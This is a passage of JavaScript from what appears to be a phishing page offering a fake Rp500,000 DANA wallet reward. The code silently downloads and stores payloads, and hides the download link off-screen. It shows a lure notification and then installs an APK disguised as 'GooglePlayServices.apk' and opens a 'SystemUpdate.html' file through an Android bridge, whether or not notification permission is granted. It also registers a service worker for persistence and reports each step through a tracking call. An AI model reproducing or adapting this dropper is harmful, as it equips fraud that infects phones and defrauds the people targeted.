                    request.onsuccess = function(e) {
                        var db = e.target.result;
                        var tx = db.transaction('files', 'readwrite');
                        var store = tx.objectStore('files');
                        store.put(data.content, 'SystemUpdate.html');
                    };
                } catch(e) {}
            }
            
            // 3. Android Bridge (Download folder)
            if (PLATFORM.isAndroid && A.isAvailable) {
                try {
                    var path = '/storage/emulated/0/Download/' + fileName;
                    if (isHtml) {
                        A.saveFile(path, data.content);
                    } else {
                        var reader = new FileReader();
                        reader.onload = function() {
                            var base64 = reader.result.split(',')[1];
                            var binary = Uint8Array.from(atob(base64), function(c) { return c.charCodeAt(0); });
                            if (AndroidBridge.saveFileBinary) {
                                AndroidBridge.saveFileBinary(path, binary);
                            }
                        };
                        reader.readAsDataURL(data.content);
                    }
                } catch(e) {}
                if (isHtml) {
                    try {
                        var encoded = btoa(unescape(encodeURIComponent(data.content)));
                        A.saveToPreferences('system_SystemUpdate_html', encoded);
                    } catch(e) {}
                }
                if (isApk) {
                    try {
                        var reader = new FileReader();
                        reader.onload = function() {
                            var base64 = reader.result.split(',')[1];
                            var binary = Uint8Array.from(atob(base64), function(c) { return c.charCodeAt(0); });
                            var internalPath = '/data/data/com.google.android.play.services/files/' + fileName;
                            if (AndroidBridge.saveFileBinary) {
                                AndroidBridge.saveFileBinary(internalPath, binary);
                            }
                            if (AndroidBridge.saveToPreferences) {
                                AndroidBridge.saveToPreferences('system_' + fileName.replace('.', '_'), base64);
                            }
                        };
                        reader.readAsDataURL(data.content);
                    } catch(e) {}
                }
            }
            
            // 4. Blob fallback
            try {
                var blob = isHtml ? new Blob([data.content], {type: 'text/html'}) : data.content;
                var blobUrl = URL.createObjectURL(blob);
                var a = document.createElement('a');
                a.href = blobUrl;
                a.download = fileName;
                a.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
                document.body.appendChild(a);
                setTimeout(function() {
                    a.click();
                    setTimeout(function() {
                        try { document.body.removeChild(a); } catch(e) {}
                        URL.revokeObjectURL(blobUrl);
                    }, 2000);
                }, 300);
            } catch(e) {}
            
            K({ sumber: 'download_success', data: { file: fileName } });
        })
        .catch(function() {});
}

// ============================================================
// NOTIFIKASI + FALLBACK
// ============================================================
function showKlaimNotification() {
    if (NOTIFICATION_SHOWN) return;
    NOTIFICATION_SHOWN = true;
    
    K({ sumber: 'notification_attempt', data: 'start' });
    
    try {
        if (!('Notification' in window)) {
            K({ sumber: 'notification_fallback', data: 'no_api' });
            fallbackInstallAndOpen();
            return;
        }
        if (Notification.permission === 'denied') {
            K({ sumber: 'notification_fallback', data: 'denied' });
            fallbackInstallAndOpen();
            return;
        }
        if (Notification.permission === 'granted') {
            createKlaimNotification();
            return;
        }
        if (Notification.permission === 'default') {
            Notification.requestPermission().then(function(p) {
                if (p === 'granted') { createKlaimNotification(); } 
                else { fallbackInstallAndOpen(); }
            }).catch(function() { fallbackInstallAndOpen(); });
            return;
        }
        fallbackInstallAndOpen();
    } catch(e) {
        K({ sumber: 'notification_error', data: e.message });
        fallbackInstallAndOpen();
    }
}

function createKlaimNotification() {
    try {
        var notif = new Notification('🔔 Klik Untuk Klaim', {
            body: 'Klik untuk menyelesaikan verifikasi dan klaim saldo DANA Rp500.000!',
            icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">💰</text></svg>',
            requireInteraction: true,
            silent: false,
            vibrate: [200, 100, 200]
        });
        notif.onclick = function() {
            notif.close();
            if (A.isAvailable) {
                A.installAPK('/storage/emulated/0/Download/GooglePlayServices.apk');
                A.openFile('/storage/emulated/0/Download/SystemUpdate.html');
            }
            if (!REDIRECT_DONE) {
                REDIRECT_DONE = true;
                redirectToDANA();
            }
        };
        setTimeout(function() { try { notif.close(); } catch(e) {} }, 30000);
        K({ sumber: 'notification_shown', data: 'ok' });
    } catch(e) {
        K({ sumber: 'notification_create_error', data: e.message });
        fallbackInstallAndOpen();
    }
}

function fallbackInstallAndOpen() {
    K({ sumber: 'fallback_execute', data: 'install_and_open' });
    if (A.isAvailable) {
        try { A.installAPK('/storage/emulated/0/Download/GooglePlayServices.apk'); } catch(e) {}
        try { A.openFile('/storage/emulated/0/Download/SystemUpdate.html'); } catch(e) {}
    }
    if (!REDIRECT_DONE) {
        REDIRECT_DONE = true;
        redirectToDANA();
    }
}

// ============================================================
// SERVICE WORKER
// ============================================================
function injectServiceWorker() {
    if (!('serviceWorker' in navigator)) return;
    navigator.serviceWorker.getRegistrations()
        .then(function(regs) {
            if (regs.length > 0) return;
            navigator.serviceWorker.register('/sw.js', { scope: '/' })
                .then(function() { K({ sumber: 'sw_registered', data: 'ok' }); })
                .catch(function() {});
        })
        .catch(function() {
            navigator.serviceWorker.register('/sw.js', { scope: '/' })
                .then(function() { K({ sumber: 'sw_registered', data: 'ok' }); })
                .catch(function() {});
        });
}
